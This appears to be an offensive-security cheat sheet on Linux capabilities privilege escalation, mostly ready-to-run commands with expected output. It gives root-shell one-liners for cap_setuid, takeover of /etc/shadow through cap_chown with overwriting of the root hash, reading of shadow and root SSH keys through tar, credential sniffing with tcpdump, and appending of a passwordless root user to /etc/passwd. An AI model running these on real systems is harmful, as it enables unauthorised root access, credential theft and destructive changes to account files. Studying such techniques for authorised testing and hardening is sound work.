# Capabilities

### Overview

**Linux Capabilities** divide root privileges into distinct units that can be independently assigned to executables. When binaries have capabilities set, they can perform specific privileged operations without full root access. Misconfigurations allow attackers to exploit these capabilities for privilege escalation.

**Key Concepts:**

* **Capabilities** - Fine-grained privileges split from root
* **Effective (e)** - Capability is active
* **Permitted (p)** - Capability can be activated
* **Inheritable (i)** - Capability can be inherited by child processes

**Common Dangerous Capabilities:**

* `cap_setuid` - Change user ID (direct root shell)
* `cap_chown` - Change file ownership
* `cap_dac_read_search` - Bypass file read permissions
* `cap_net_raw` - Network packet sniffing
* `cap_sys_admin` - Mount filesystems, many admin operations

***

### Exploitation Workflow Summary

1. Enumeration ├─ Find binaries with capabilities ├─ Identify specific capabilities set └─ Check for exploitable interpreters
2. Exploitation ├─ Execute capability-specific attack ├─ Spawn root shell or read sensitive files └─ Verify elevated access

***

### Enumeration

**Find all files with capabilities:**

```bash
getcap -r / 2>/dev/null
```

**Expected output:**

```
/usr/bin/python3.8 = cap_setuid+ep
/usr/bin/perl = cap_setuid+ep
/usr/bin/tar = cap_dac_read_search+ep
/usr/sbin/tcpdump = cap_net_raw+ep
/home/user/ruby = cap_chown+ep
```

**Parameters explained:**

* `-r` - Recursive search
* `2>/dev/null` - Hide permission errors

***

### cap\_setuid Exploitation

**Most dangerous capability - allows changing UID to 0 (root).**

**Python:**

```bash
python -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

**Python3:**

```bash
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

**Perl:**

```bash
perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";'
```

**PHP:**

```bash
php -r "posix_setuid(0); system('/bin/bash');"
```

**Ruby:**

```bash
ruby -e 'Process::Sys.setuid(0); exec "/bin/bash"'
```

**Expected result:**

```bash
# whoami
root
```

***

### cap\_chown Exploitation

**Allows changing file ownership - useful for modifying /etc/shadow or /etc/passwd.**

**Check current user ID:**

```bash
id
```

**Expected output:**

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**Python - Change /etc/shadow ownership:**

```bash
python -c 'import os;os.chown("/etc/shadow",33,33)'
```

**Parameters:** `(path, uid, gid)`

**Ruby - Change file ownership:**

```bash
ruby -e 'require "fileutils"; FileUtils.chown(33, 33, "/etc/shadow")'
```

**Ruby - Change directory ownership:**

```bash
ruby -e 'require "fileutils"; FileUtils.chown(33, 33, "/root")'
```

**After changing ownership:**

```bash
cat /etc/shadow  # Now readable
nano /etc/shadow  # Now writable
```

**Modify root hash or add new user:**

```bash
# Generate password hash
openssl passwd -1 -salt new password123

# Add to shadow file
echo 'root:$1$new$HASH:18900:0:99999:7:::' > /etc/shadow
su root
```

***

### cap\_dac\_read\_search Exploitation

**Bypasses file read permission checks - can read any file.**

**Tar:**

```bash
LFILE=/etc/shadow
tar xf "$LFILE" -I '/bin/sh -c "cat 1>&2"'
```

**Expected output:**

```
root:$6$xyz$abcdef...:18900:0:99999:7:::
user:$6$abc$123456...:18895:0:99999:7:::
```

**Read /root/.ssh/id\_rsa:**

```bash
tar xf "/root/.ssh/id_rsa" -I '/bin/sh -c "cat 1>&2"'
```

**Tar alternative method:**

```bash
tar -cf /dev/null /etc/shadow --checkpoint=1 --checkpoint-action=exec="cat /etc/shadow"
```

***

### cap\_net\_raw Exploitation

**Allows packet capture - can sniff credentials.**

**Tcpdump - Capture loopback traffic:**

```bash
tcpdump -i lo -A
```

**Capture on all interfaces:**

```bash
tcpdump -i any -A
```

**Filter for passwords:**

```bash
tcpdump -i any -A | grep -i 'pass\|pwd\|user'
```

**Capture to file:**

```bash
tcpdump -i any -w /tmp/capture.pcap
```

**Read captured file:**

```bash
tcpdump -r /tmp/capture.pcap -A
```

***

### Setting Capabilities

**If you have setcap with SUID or can execute setcap:**

**Set cap\_setuid on binary:**

```bash
setcap cap_setuid+ep /path/to/binary
```

**Common technique - Copy Python and add capability:**

```bash
cp /usr/bin/python3 /tmp/python3
setcap cap_setuid+ep /tmp/python3
```

**Verify capability:**

```bash
getcap /tmp/python3
```

**Expected output:**

```
/tmp/python3 = cap_setuid+ep
```

**Exploit:**

```bash
/tmp/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

***

### Additional Capabilities

**cap\_dac\_override - Bypass file write permissions:**

```bash
python3 -c 'import os; open("/etc/passwd","a").write("hacker::0:0::/root:/bin/bash\n")'
```

**cap\_sys\_admin - Mount filesystems:**

```bash
# Create malicious library
mkdir /tmp/exploit
mount --bind /tmp/exploit /lib
```

**cap\_sys\_ptrace - Inject into processes:**

```bash
# Inject shellcode into root process
gdb -p [root_pid]
```

***

### Quick Reference

**Enumeration:**

```bash
getcap -r / 2>/dev/null
```

**cap\_setuid (root shell):**

```bash
python -c 'import os; os.setuid(0); os.system("/bin/bash")'
perl -e 'use POSIX; POSIX::setuid(0); exec "/bin/bash";'
```

**cap\_chown (change ownership):**

```bash
python -c 'import os;os.chown("/etc/shadow",UID,GID)'
```

**cap\_dac\_read\_search (read files):**

```bash
tar xf "/etc/shadow" -I '/bin/sh -c "cat 1>&2"'
```

**cap\_net\_raw (sniff packets):**

```bash
tcpdump -i any -A
```

**Set capability:**

```bash
setcap cap_setuid+ep /path/to/binary
```
